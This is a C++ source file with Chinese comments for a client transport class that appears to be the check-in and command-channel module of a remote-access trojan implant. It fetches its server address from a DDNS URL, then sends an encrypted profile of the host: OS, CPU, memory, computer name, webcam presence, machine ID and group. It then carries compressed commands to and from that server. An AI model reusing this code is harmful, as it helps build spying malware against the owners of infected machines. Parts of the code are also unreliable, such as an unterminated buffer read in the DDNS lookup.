// MyTrans.cpp: implementation of the CMyClientTran class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyClientTran.h"
#include "lzw.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyClientTran::CMyClientTran()
{
	m_Socket = NULL;
	m_IsProxy = FALSE;
	ZeroMemory(m_Addr, MAX_PATH);
	ZeroMemory(&m_DllInfo, sizeof(PSDLLINFO));
	m_Port = 0;
}

CMyClientTran::~CMyClientTran()
{
	Close();
}

SOCKET CMyClientTran::GetSafeSocket()
{
	return m_Socket;
}

BOOL CMyClientTran::Create(DWORD nCmd, PSDLLINFO m_Info)
{
	Close();

	CopyMemory(&m_DllInfo, &m_Info, sizeof(PSDLLINFO));
	StrCpy(m_Addr, m_DllInfo.m_ServerAddr);
	m_Port = m_DllInfo.m_ServerPort;

	//查看是否有ddns
	if(lstrlen(m_DllInfo.m_DdnsUrl) != 0)
	{
		GetRealServerInfo(m_DllInfo.m_DdnsUrl);
	}

	//连接到服务器
	m_Socket = GetConnectSocket(m_Addr, m_Port);
	if(m_Socket == NULL)
	{
		return FALSE;
	}
	
	//协商初始数据
	LOGININFO m_LoginInfo = {0};
	m_LoginInfo.m_Cmd = nCmd;
	m_LoginInfo.m_hWnd = (HWND) m_DllInfo.m_ExtInfo;
	FillMySysInfo(&m_LoginInfo, &m_DllInfo);
	MyMainFunc::EncryptByte(&m_LoginInfo, sizeof(LOGININFO));
	return SendData(&m_LoginInfo, sizeof(LOGININFO));
}

BOOL CMyClientTran::GetRealServerInfo(LPCTSTR m_DdnsUrl)
{
	char m_Url[1024] = {0};
	wsprintf(m_Url, "http://%s", m_DdnsUrl);
	char m_FileName[MAX_PATH] = {0};
	GetTempPath(250, m_FileName);
	wsprintf(m_FileName + lstrlen(m_FileName), "%08x.txt", GetCurrentThreadId());
	if(!MyMainFunc::GetUrlFile(m_Url, m_FileName))
	{
		return FALSE;
	}

	HANDLE hFile = CreateFile(m_FileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD nReadLen = 0;
	DWORD nFileLen = GetFileSize(hFile, NULL);
	char* pFileBuf = new char[nFileLen];
	ReadFile(hFile, pFileBuf, nFileLen, &nReadLen, NULL);
	CloseHandle(hFile);
	DeleteFile(m_FileName);

	//取掉末尾
	char* pDot = StrChr(pFileBuf , '\r');
	if(pDot != NULL)
	{
		*pDot = 0;
	}
	pDot = StrChr(pFileBuf , '\n');
	if(pDot != NULL)
	{
		*pDot = 0;
	}

	pDot = StrChr(pFileBuf , ':');
	if(pDot == NULL) 
	{
		StrCpy(m_Addr, pFileBuf);
		m_Port = 80;
		delete [] pFileBuf;
		return TRUE;
	}

	*pDot = 0;
	lstrcpyA(m_Addr, pFileBuf);
	m_Port = StrToIntA(pDot + 1);
	delete [] pFileBuf;
	return TRUE;
}

//发送数据
BOOL CMyClientTran::SendData(LPVOID data, DWORD len)
{
	char* p = (char*) data;
	DWORD i = 0;
	int k = (int) len;
	int ret = 0;
	
	if(m_Socket == NULL)
	{
		return FALSE;
	}

	while(i < len)
	{
		ret = send(m_Socket, p, k, 0);
		if(ret <= 0)
		{
			return FALSE;
		}

		i += ret;
		p += ret;
		k -= ret;
	}
	return TRUE;
}

//接收数据
BOOL CMyClientTran::RecvData(LPVOID data, DWORD len)
{
	char* p = (char*) data;
	DWORD i = 0;
	int k = (int) len;
	int ret = 0;

	if(m_Socket == NULL)
	{
		return FALSE;
	}

	while(i < len)
	{
		ret = recv(m_Socket, p, k, 0);
		if(ret <= 0)
		{
			return FALSE;
		}

		i += ret;
		p += ret;
		k -= ret;
	}
	return TRUE;
}

void CMyClientTran::Close()
{
	if(m_Socket != NULL)
	{
		closesocket(m_Socket);
		m_Socket = NULL;
	}
}

BOOL CMyClientTran::SendDataWithCmd(LPVOID pSendData, DWORD dSendLen, DWORD nCmd)
{
	BYTE* pZipData = NULL;
	if(pSendData != NULL && dSendLen != 0)
	{
		pZipData = new BYTE[dSendLen * 2 + 65535];
		ZeroMemory(pZipData, dSendLen * 2 + 65535);
		FCLzw lzw;
		lzw.PcZip((BYTE*) pSendData, (BYTE*) pZipData, &dSendLen);
	}
	else
	{
		pZipData = (BYTE*) pSendData;
	}

	//发送包头
	if(!SendData(&dSendLen, sizeof(DWORD)))
	{
		if(pZipData != NULL && pZipData != pSendData)
		{
			delete [] pZipData;
		}
		return FALSE;
	}

	//发送命令
	if(!SendData(&nCmd, sizeof(DWORD)))
	{
		if(pZipData != NULL && pZipData != pSendData)
		{
			delete [] pZipData;
		}
		return FALSE;
	}

	if(dSendLen == 0)
	{
		return TRUE;
	}

	BOOL bRet = SendData(pZipData, dSendLen);
	if(pZipData != NULL && pZipData != pSendData)
	{
		delete [] pZipData;
	}
	return bRet;
}

BOOL CMyClientTran::RecvDataWithCmd(LPBYTE* pRecvData, DWORD* dRecvLen, DWORD* dCmd)
{
	//接收包头
	DWORD dZipLen = 0;
	if(!RecvData(&dZipLen, sizeof(DWORD)))
	{
		return FALSE;
	}

	//接收命令
	if(!RecvData(dCmd, sizeof(DWORD)))
	{
		return FALSE;
	}

	if(dZipLen == 0)
	{
		*dRecvLen = 0;
		return TRUE;
	}

	//接收包数据
	BYTE* pZipData = new BYTE[dZipLen];
	if(!RecvData(pZipData, dZipLen))
	{
		delete [] pZipData;
		return FALSE;
	}

	//原始长度
	*dRecvLen = *((DWORD*) &pZipData[12]);
	BYTE* pData = new BYTE[*dRecvLen + 65535];
	ZeroMemory(pData, *dRecvLen + 65535);

	FCLzw lzw;
	lzw.PcUnZip(pZipData, pData, dRecvLen);
	delete [] pZipData;
	*pRecvData = pData;
	return TRUE;
}


void CMyClientTran::FillMySysInfo(LPLOGININFO pSysInfo, LPPSDLLINFO pDllInfo)
{
	//取操作系统
	pSysInfo->m_SysType = IsShellSysType();

	pSysInfo->m_UserId = PS_USER_ID;

	//取CPU信息
	SYSTEM_INFO	m_pSysInfo = {0};
	GetSystemInfo(&m_pSysInfo);
	pSysInfo->m_CpuSpeed = CPU_Frequency();
	pSysInfo->m_CpuCount = (UINT) m_pSysInfo.dwNumberOfProcessors;
	
	//取内存容量
	MEMORYSTATUSEX Buffer = {0};
	Buffer.dwLength = sizeof(Buffer);
	GlobalMemoryStatusEx(&Buffer);
	pSysInfo->m_MemContent = Buffer.ullTotalPhys;

	//取计算机名
	DWORD m_Len = 16;
	GetComputerName(pSysInfo->m_PcName, &m_Len);

	if(pSysInfo->m_Cmd == WM_CONNECT_MAIN)
	{
		//是否有摄像头
		pSysInfo->m_IsVideo = GetVideoInfo();
	}

	//计算机注释
	lstrcpy(pSysInfo->m_Note, pDllInfo->m_Title);

	//计算机唯一标识
	CopyMemory(pSysInfo->m_Id, pDllInfo->m_ID, 16);

	//用户分组
	lstrcpy(pSysInfo->m_Group, pDllInfo->m_Group);

	//软件版本
	lstrcpy(pSysInfo->m_SoftVer, pDllInfo->m_SoftVer);

	pSysInfo->m_ACP = GetACP();
	pSysInfo->m_OEMCP = GetOEMCP();
}

SOCKET CMyClientTran::GetConnectSocket(LPCTSTR pServerAddr, UINT nServerPort)
{
	struct sockaddr_in	m_ServerAddr = {0}; 
	int			m_AddrLen = sizeof(struct sockaddr_in);
	SOCKET		m_Socket = 0;

	char m_sServerIp[MAX_PATH] = {0};
	StrCpy(m_sServerIp, pServerAddr);
	DWORD dIp = inet_addr(m_sServerIp);
	if(dIp == INADDR_NONE)
	{
		PHOSTENT hostinfo = gethostbyname(m_sServerIp);
		if(hostinfo == NULL)
		{
			return NULL;
		}
		struct sockaddr_in dest = {0};
		CopyMemory(&(dest.sin_addr), hostinfo->h_addr_list[0], hostinfo->h_length);
		StrCpy(m_sServerIp, inet_ntoa(dest.sin_addr));
	}

	//初始化连接信息
	m_ServerAddr.sin_addr.S_un.S_addr = inet_addr(m_sServerIp);
	m_ServerAddr.sin_port = htons(nServerPort); 
	m_ServerAddr.sin_family = AF_INET;

	//创建发送套接字
	m_Socket = socket(AF_INET, SOCK_STREAM, 0);
	if(m_Socket == INVALID_SOCKET)
	{
		return NULL;
	}
	
	//连接客户计算机
	if(connect(m_Socket, (sockaddr*)& m_ServerAddr, m_AddrLen) == SOCKET_ERROR) 
	{ 
		closesocket(m_Socket); 
		return NULL;
	}

	BOOL nodelayval = TRUE;
	if (setsockopt(m_Socket, IPPROTO_TCP, TCP_NODELAY, (const char *) &nodelayval, sizeof(BOOL)))
	{
		closesocket(m_Socket); 
		return NULL;
	}

	int one = 1;
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&one, sizeof(one)))
    {
		closesocket(m_Socket); 
		return NULL;
    }

	one = 3600 * 1000;
	if (setsockopt(m_Socket, SOL_SOCKET, SO_RCVTIMEO, (char *)&one, sizeof(one)))
    {
		closesocket(m_Socket); 
		return NULL;
    }

	one = 3600 * 1000;
	if (setsockopt(m_Socket, SOL_SOCKET, SO_SNDTIMEO, (char *)&one, sizeof(one)))
    {
		closesocket(m_Socket); 
		return NULL;
    }

	//连接成功
	return m_Socket;
}

Type CMyClientTran::IsShellSysType()
{
	Type ShellType = WindowsNT4;
	OSVERSIONINFO osvi = {0};
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	DWORD winVer = GetVersion();
	if(winVer < 0x80000000)
	{
		GetVersionEx(&osvi);
		if(osvi.dwMajorVersion == 5L && osvi.dwMinorVersion == 0L)
		{
			ShellType = Windows2000;
		}
		else if(osvi.dwMajorVersion == 5L && osvi.dwMinorVersion == 1L)
		{
			ShellType = WindowsXP;
		}
		else if((osvi.dwMajorVersion == 5L && osvi.dwMinorVersion == 2L))
		{
			ShellType = Windows2003;
		}
		else if((osvi.dwMajorVersion == 6L && osvi.dwMinorVersion == 0L))
		{
			ShellType = Vista;
		}
		else if((osvi.dwMajorVersion == 6L && osvi.dwMinorVersion == 1L))
		{
			ShellType = Windows7;
		}
		else
		{
			ShellType = WindowsNT4;
		}
	}
	return ShellType;
}

int CMyClientTran::CPU_Frequency(void)
{
   LARGE_INTEGER CurrTicks, TicksCount;
    __int64 iStartCounter, iStopCounter;

    DWORD dwOldProcessP = GetPriorityClass(GetCurrentProcess());
    DWORD dwOldThreadP = GetThreadPriority(GetCurrentThread());

    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    QueryPerformanceFrequency(&TicksCount);
    QueryPerformanceCounter(&CurrTicks);

    TicksCount.QuadPart /= 16;
    TicksCount.QuadPart += CurrTicks.QuadPart;

    _asm rdtsc;
    _asm mov DWORD PTR iStartCounter, EAX;
    _asm mov DWORD PTR (iStartCounter+4), EDX;

    while(CurrTicks.QuadPart<TicksCount.QuadPart)
	{
        QueryPerformanceCounter(&CurrTicks);
	}

    _asm rdtsc;
    _asm mov DWORD PTR iStopCounter, EAX;
    _asm mov DWORD PTR (iStopCounter + 4), EDX;

    SetThreadPriority(GetCurrentThread(), dwOldThreadP);
    SetPriorityClass(GetCurrentProcess(), dwOldProcessP);

    return (int)((iStopCounter-iStartCounter)/62500);
}

BOOL CMyClientTran::GetDefaultCapDevice( IBaseFilter ** ppCap )
{
   HRESULT hr;

    ASSERT(ppCap);
    if (!ppCap)
        return FALSE;

    *ppCap = NULL;

    // create an enumerator
    //
    CComPtr< ICreateDevEnum > pCreateDevEnum;
    pCreateDevEnum.CoCreateInstance( CLSID_SystemDeviceEnum );

     if( !pCreateDevEnum )
        return FALSE;

    // enumerate video capture devices
    //
    CComPtr< IEnumMoniker > pEm;
    pCreateDevEnum->CreateClassEnumerator( CLSID_VideoInputDeviceCategory, &pEm, 0 );

    if(pEm == NULL)
        return FALSE;

    pEm->Reset( );
 
    // go through and find first video capture device
    //
    while( 1 )
    {
        ULONG ulFetched = 0;
        CComPtr< IMoniker > pM;

        hr = pEm->Next( 1, &pM, &ulFetched );
        if( hr != S_OK )
            break;

        // get the property bag interface from the moniker
        //
        CComPtr< IPropertyBag > pBag;
        hr = pM->BindToStorage( 0, 0, IID_IPropertyBag, (void**) &pBag );
        if( hr != S_OK )
            continue;

        // ask for the english-readable name
        //
        CComVariant var;
        var.vt = VT_BSTR;
        hr = pBag->Read( L"FriendlyName", &var, NULL );
        if( hr != S_OK )
            continue;

        // set it in our UI
        //
        USES_CONVERSION;
  
        // ask for the actual filter
        //
        hr = pM->BindToObject( 0, 0, IID_IBaseFilter, (void**) ppCap );
        if( *ppCap )
            break;
    }
	if(*ppCap == NULL)
	{
		return FALSE;
	}
    return TRUE;
}

char CMyClientTran::GetVideoInfo()
{
	CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	CComPtr< IBaseFilter > pCap;
    BOOL ret = GetDefaultCapDevice(&pCap);
    if(!ret)
    {
        return 0;
    }
	return 1;
}
